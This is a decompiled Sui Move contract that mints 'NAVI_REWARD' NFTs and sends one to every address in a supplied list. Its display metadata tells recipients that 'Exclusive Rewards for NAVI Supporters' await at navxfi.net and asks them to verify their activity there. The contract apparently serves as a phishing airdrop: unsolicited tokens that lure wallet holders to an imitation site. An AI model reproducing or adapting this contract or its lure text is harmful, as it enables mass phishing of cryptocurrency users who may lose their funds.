module 0x8d9966cbcaa3435ad6a825fa626b5267a6fe468fc6c4d84c32c7c5674e2032b8::Navi_Reward_W3 {
    struct NAVI_REWARD_W3 has drop {
        dummy_field: bool,
    }

    struct NAVI_REWARD has store, key {
        id: 0x2::object::UID,
        image_url: 0x1::string::String,
    }

    public entry fun GiveReward(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = NAVI_REWARD{
                id        : 0x2::object::new(arg1),
                image_url : 0x1::string::utf8(b"ipfs://QmXEdJf7kAfEo2CTewPtYm4QAbTuFY8qmupGzEu82TPkuc"),
            };
            0x2::transfer::public_transfer<NAVI_REWARD>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: NAVI_REWARD, arg1: &mut 0x2::tx_context::TxContext) {
        let NAVI_REWARD {
            id        : v0,
            image_url : _,
        } = arg0;
        0x2::object::delete(v0);
    }

    fun init(arg0: NAVI_REWARD_W3, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Reward"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"ipfs://QmXEdJf7kAfEo2CTewPtYm4QAbTuFY8qmupGzEu82TPkuc"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Exclusive Rewards for NAVI Supporters are ready at navxfi.net  Verify your activity and claim your reward."));
        let v4 = 0x2::package::claim<NAVI_REWARD_W3>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<NAVI_REWARD>(&v4, v0, v2, arg1);
        0x2::display::update_version<NAVI_REWARD>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<NAVI_REWARD>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

